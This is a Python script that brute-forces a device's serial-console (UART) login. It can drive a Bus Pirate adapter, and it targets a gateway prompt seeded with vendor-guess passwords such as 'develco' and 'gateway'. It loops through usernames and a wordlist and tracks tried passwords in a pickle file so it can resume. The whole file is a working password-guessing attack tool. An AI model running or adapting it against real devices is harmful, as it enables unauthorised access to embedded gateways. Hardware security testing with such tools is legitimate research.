#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import pickle
import logging
import serial
from time import sleep, time
from argparse import ArgumentParser, FileType
from datetime import datetime
from traceback import format_exc

LOG_FORMAT = '%(asctime)s - %(levelname)s - %(message)s'
DATE_FORMAT = '%Y-%m-%d %H:%M:%S'
VERSION = '1.0'
LOG_LEVEL = logging.DEBUG

LOGIN_TEXT = 'gw-6CB4 login:'
PASS_TEXT = 'Password:'
LOGIN_INCORRECT = 'Login incorrect'
BUSPIRATE_PATTERN = 'HiZ>'


logger = logging.getLogger('UART Bruteforce')
logger.setLevel(LOG_LEVEL)
formatter = logging.Formatter(LOG_FORMAT, DATE_FORMAT)

stream_handler = logging.StreamHandler()
stream_handler.setFormatter(formatter)
stream_handler.setLevel(LOG_LEVEL)
logger.addHandler(stream_handler)
date_format_filename = datetime.now().strftime("%Y%m%d_%H%M%S")
file_handler = logging.FileHandler('log_{}.txt'.format(date_format_filename), mode='a', encoding='utf-8')
file_handler.setFormatter(formatter)
file_handler.setLevel(LOG_LEVEL)
logger.addHandler(file_handler)


def setup_buspirate(ser):
    logger.info('Setting up buspirate...')
    # mode
    ser.write(b"m\n")
    print(recieve(ser))
    # uart
    ser.write(b"3\n")
    print(recieve(ser))
    # 115200
    ser.write(b"9\n")
    print(recieve(ser))
    # Data bits and parity
    ser.write(b"1\n")
    print(recieve(ser))
    # Stop bits
    ser.write(b"1\n")
    print(recieve(ser))
    # polarity
    ser.write(b"1\n")
    print(recieve(ser))
    # output type normal
    ser.write(b"2\n")
    print(recieve(ser))
    # start bridge
    ser.write(b"(3)\n")
    print(recieve(ser))
    # confirm
    ser.write(b"y\n")


def recieve(ser):
    to_recieve = ser.in_waiting
    sleep(.5)
    while to_recieve < ser.in_waiting:
        to_recieve = ser.in_waiting
        sleep(1)
    content: str = ser.read(to_recieve).decode('utf-8', 'backslashreplace')

    for line in content.split("\r\n"):
        if "[" in line:
            start = content.index("[")
            end = -1
            if "started" in line:
                end = content.index("started") + 7
            if "stopped" in line:
                end = content.index("stopped") + 7
            content = content[:start] + content[end:]
        # print(line)
    content = content.strip()
    return content


def main(device, speed, users, wordlist_file):

    previous: dict = pickle.load(open("previous.p", "rb"))

    wordlist = ["develco", "squid", "developer", "gateway", "Develco"]
    for word in wordlist_file:
        wordlist.append(word)

    with serial.Serial(device, speed, timeout=0) as ser:
        ser.reset_input_buffer()
        ser.reset_output_buffer()
        ser.write(b"\n\n")
        content = recieve(ser)
        if BUSPIRATE_PATTERN in content:
            setup_buspirate(ser)
            content = recieve(ser)

        content = content.split("\n\r")[-1].strip()

        for user in users:
            # check each password in the list

            if user.strip() not in previous:
                print("User dosnt exist, creating new entry")
                previous[user.strip()] = dict()

            logger.info("Using {} as user".format(user.strip()))
            count = 0
            for line in wordlist:
                if LOGIN_TEXT not in content:
                    raise ValueError('No LOGIN_TEXT returned: {}'.format(repr(content)))
                password = line.strip().encode()

                if password.strip() in previous[user.strip()]:
                    # print("skipping password", password)
                    continue

                logger.debug('Trying password {}'.format(line.strip()))
                ser.write(user.encode())
                ser.write(b"\n")
                content = recieve(ser)

                ignore = ['\r', '\n', '', "\r\n"]
                while content in ignore or content[0] == '[':
                    content = recieve(ser)
                if PASS_TEXT not in content:
                    raise ValueError('Invalid return: {}'.format(repr(content)))
                ser.write(password)
                ser.write(b"\n")
                content = recieve(ser)
                # password checking takes a while
                while content in ignore:
                    content = recieve(ser)

                logger.debug('Password response: {}'.format(repr(content)))
                if LOGIN_INCORRECT not in content or content[0] == '[':
                    logger.info('Found password? Pass: {}, Return: {}'.format(password, repr(content)))
                    return

                previous[user.strip()][password.strip()] = 1

                count += 1
                if count > 10:
                    count = 0
                    pickle.dump(previous, open("previous.p", "wb"))
            pickle.dump(previous, open("previous.p", "wb"))

if __name__ == '__main__':
    overall_start_time = time()
    parser = ArgumentParser(description='Bruteforces a login via UART')
    parser.add_argument('-d', dest='device', type=str, default="/dev/ttyUSB0",
                        help="The serial device. eg /dev/tty.usbmodem")
    parser.add_argument('-s', '--speed', type=int, dest='speed', default=115200, help='Baud rate')
    parser.add_argument('-u', '--users', type=FileType('rt', encoding='UTF-8'), dest='users', default='users',
                        help='Usernames to bruteforce')
    parser.add_argument('-w', '--wordlist', type=FileType('rt', encoding='UTF-8'), dest='wordlist', required=True,
                        help='Wordlist used for bruteforcing')
    parser.add_argument('--version', action='version', version='%(prog)s {}'.format(VERSION))
    args = parser.parse_args()
    try:
        main(args.device, args.speed, args.users, args.wordlist)
    except Exception as e:
        logger.critical('Exception: {}'.format(e))
        logger.critical(format_exc())

    logger.info('script finished: {} seconds'.format(round(time() - overall_start_time, 2)))

